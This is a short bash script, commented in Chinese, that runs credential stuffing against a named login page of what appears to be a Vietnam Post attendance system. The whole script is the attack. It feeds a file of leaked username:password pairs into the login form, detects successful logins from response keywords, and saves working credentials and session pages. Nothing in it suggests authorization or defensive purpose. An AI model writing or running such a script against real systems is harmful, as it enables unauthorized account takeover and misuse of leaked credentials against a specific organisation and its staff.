#!/bin/bash
# Chamcong泄露凭证测试

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 Chamcong考勤系统 - 凭证爆破"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGET="http://vps.vnpost.vn/chamcong/Login.aspx"
count=0
success=0

while IFS=':' read -r user pass; do
    count=$((count+1))
    echo -n "[$count] 测试: $user:$pass ... "
    
    # POST登录请求 (简单表单，无ViewState)
    resp=$(curl -sk "$TARGET" \
        -X POST \
        -d "tUser=$user&tPass=$pass" \
        -L -c /tmp/chamcong_cookie_$count.txt \
        2>&1)
    
    # 检查成功标志
    if echo "$resp" | grep -qiE "logout|index.aspx|dashboard|trang chu|welcome|xin chao"; then
        echo "✅ 成功!"
        echo "$user:$pass" >> chamcong_success.txt
        echo "$resp" > "chamcong_success_${user}.html"
        success=$((success+1))
    elif echo "$resp" | grep -qiE "login|dang nhap|sai|incorrect|invalid"; then
        echo "❌ 失败"
    else
        echo "⚠️  未知响应 (长度: ${#resp})"
        echo "$resp" > "chamcong_unknown_${user}.html"
    fi
    
    sleep 1
done < chamcong_leaked_creds.txt

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "测试完成: $count个凭证"
echo "成功: $success个"
[ $success -gt 0 ] && echo "✅ 成功凭证:" && cat chamcong_success.txt
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
